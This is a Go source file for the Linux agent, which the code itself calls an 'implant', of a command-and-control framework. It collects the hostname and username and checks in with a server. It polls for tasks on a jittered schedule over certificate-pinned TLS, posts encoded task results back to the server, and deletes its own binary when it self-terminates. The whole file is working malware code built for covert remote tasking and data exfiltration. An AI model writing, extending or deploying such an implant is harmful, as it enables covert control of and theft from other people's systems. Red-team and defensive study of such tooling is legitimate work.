//go:build linux

package agent_helper

import (
	"crypto/sha256"
	"crypto/subtle"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io"
	mathrand "math/rand"
	"net/http"
	"os"
	"os/user"
	"time"

	"bytes"
	"encoding/json"
	"galleon/agent_config"
	"galleon/debug"
)

var rng = mathrand.New(mathrand.NewSource(time.Now().UnixNano()))

func pinnedTLSConfig() *tls.Config {
	return &tls.Config{
		MinVersion:         tls.VersionTLS12,
		InsecureSkipVerify: true, // Certificate identity is verified by the SHA-256 pin below.
		VerifyConnection: func(state tls.ConnectionState) error {
			if len(state.PeerCertificates) == 0 {
				return fmt.Errorf("server did not provide a certificate")
			}

			expected, err := hex.DecodeString(agent_config.ServerCertSHA256)
			if err != nil || len(expected) != sha256.Size {
				return fmt.Errorf("invalid embedded server certificate fingerprint")
			}

			actual := sha256.Sum256(state.PeerCertificates[0].Raw)
			if subtle.ConstantTimeCompare(actual[:], expected) != 1 {
				return fmt.Errorf("server certificate fingerprint mismatch")
			}
			return nil
		},
	}
}

type CallbackInfo struct {
	Callback_freq int
	Jitter        int
	SelfTerminate int
	StartDelay    int
}

type InitialInfo struct {
	Session       string `json:"session"`
	Hostname      string `json:"hostname"`
	Username      string `json:"username"`
	Callback_freq int    `json:"callback_freq"`
	Jitter        int    `json:"jitter"`
}

type ResultsCreate struct {
	TaskingID float64 `json:"tasking_id"`
	Session   string  `json:"session"`
	Task      string  `json:"task"`
	Args      string  `json:"args"`
	Results   string  `json:"results"`
}

var CustomClient = &http.Client{
	Transport: &http.Transport{
		TLSClientConfig:   pinnedTLSConfig(),
		DisableKeepAlives: true,
	},
	Timeout: 10 * time.Second,
}

func GatherInfo() InitialInfo {
	hostname, _ := os.Hostname()
	currentUser, _ := user.Current()

	hostInfo := InitialInfo{
		Session:       agent_config.AgentId,
		Hostname:      hostname,
		Username:      currentUser.Username,
		Callback_freq: agent_config.CallbackVal,
		Jitter:        agent_config.JitterVal,
	}
	if debug.Debug {
		fmt.Printf("[*] Gathered initial info:\nsession: %s, hostname: %s, username: %s\ncb freq: %d, jitter: %d\n",
			hostInfo.Session, hostInfo.Hostname, hostInfo.Username, hostInfo.Callback_freq, hostInfo.Jitter)
	}
	return hostInfo
}

func agentRequest(method string, url string, body io.Reader) (*http.Request, error) {
	req, err := http.NewRequest(method, url, body)
	if err != nil {
		return nil, err
	}

	for key, value := range agent_config.ReqHeaders {
		req.Header.Set(key, value)
	}
	req.Header.Set(
		"Authorization",
		fmt.Sprintf("Agent %s:%s", agent_config.AgentId, agent_config.AgentSecret),
	)
	return req, nil
}

func AgentGet(client *http.Client, url string) (*http.Response, error) {
	req, err := agentRequest(http.MethodGet, url, nil)
	if err != nil {
		return nil, err
	}
	return client.Do(req)
}

func InitialCheckin(serverUrl string, initialInfo InitialInfo) {
	for i := 0; i <= CallbackTimer.SelfTerminate; i++ {
		if i >= CallbackTimer.SelfTerminate {
			TerminateImplant()
		}
		resp, err := PostJson(serverUrl+"/implants/", initialInfo)
		if debug.Debug {
			fmt.Printf("[*] Firing initial checkin to: %s\n", serverUrl+"/implants/")
		}
		if err != nil || resp != 200 {

			time.Sleep(time.Duration(agent_config.RetryTimerVal) * time.Second)
		} else {
			return
		}
	}
}

func CheckIn(serverAddr string, session string) (int, error) {
	url := fmt.Sprintf("%s/health/%s", serverAddr, session)
	// Prevent auto redirects so if there is tasking 301 is actually returned and
	// we can fetch tasking, otherwise the main function will just return 200
	// and we will never get the tasking
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: &http.Transport{
			TLSClientConfig:   pinnedTLSConfig(),
			DisableKeepAlives: true,
		},
		Timeout: 10 * time.Second,
	}

	resp, err := AgentGet(client, url)
	if debug.Debug {
		fmt.Printf("[*] Firing health checkin to: %s\n", serverAddr+"/health/"+session)
	}
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()
	return resp.StatusCode, nil
}

func FetchTasking(serverAddr string, session string) (string, error) {
	url := fmt.Sprintf("%s/tasks/%s", serverAddr, session)

	resp, err := AgentGet(CustomClient, url)
	if debug.Debug {
		fmt.Printf("[*] Fetching tasking: %s\n", serverAddr+"/tasks/"+session)
	}
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("task fetch returned HTTP %d", resp.StatusCode)
	}
	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(bodyBytes), nil
}

func RandomJitter(baseMinutes int, jitterPercent int) time.Duration {
	randomPercent := rng.Intn(jitterPercent + 1)
	jitterFraction := float64(randomPercent) / 100.0

	baseSeconds := baseMinutes * 60
	jitterSeconds := int(float64(baseSeconds) * jitterFraction)

	totalSeconds := baseSeconds + jitterSeconds

	jitterDuration := time.Duration(totalSeconds) * time.Second
	if debug.Debug {
		fmt.Printf("[*] Jitter: %d\n", int(jitterDuration.Seconds())-60)
	}
	return jitterDuration
}

func PostJson(url string, payload interface{}) (int, error) {
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return 0, err
	}
	req, err := agentRequest(http.MethodPost, url, bytes.NewBuffer(jsonData))
	if err != nil {
		return 0, err
	}
	resp, err := CustomClient.Do(req)

	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()

	_, _ = io.ReadAll(resp.Body)

	return resp.StatusCode, nil
}

func DataShipper(serverUrl string, taskData map[string]interface{}, results string) {
	encodedOutput := EncodeToBaseHexString(results)
	encodedArgs := EncodeToBaseHexString(taskData["args"].(string))

	result := ResultsCreate{
		TaskingID: taskData["id"].(float64),
		Session:   taskData["session"].(string),
		Task:      taskData["task"].(string),
		Args:      encodedArgs,
		Results:   encodedOutput,
	}
	if debug.Debug {
		fmt.Printf("[*] Shipping results for task: %s\n", taskData["task"])
		fmt.Printf("[*] Args: %s\n", taskData["args"])
		fmt.Printf("[*] Results:\n%s\n", results)
	}
	_, _ = PostJson(serverUrl, result)

}

func TerminateImplant() {
	if debug.Debug {
		fmt.Println("[!] TerminateImplant() fired")
	}
	exePath, err := os.Executable()
	if err != nil {
		os.Exit(3)
	}

	if _, err := os.Stat(exePath); err == nil {
		err := os.Remove(exePath)
		if err != nil {
			os.Exit(2)
		}
		os.Exit(1)
	}
	// Nothing on disk, just memory
	os.Exit(0)
}
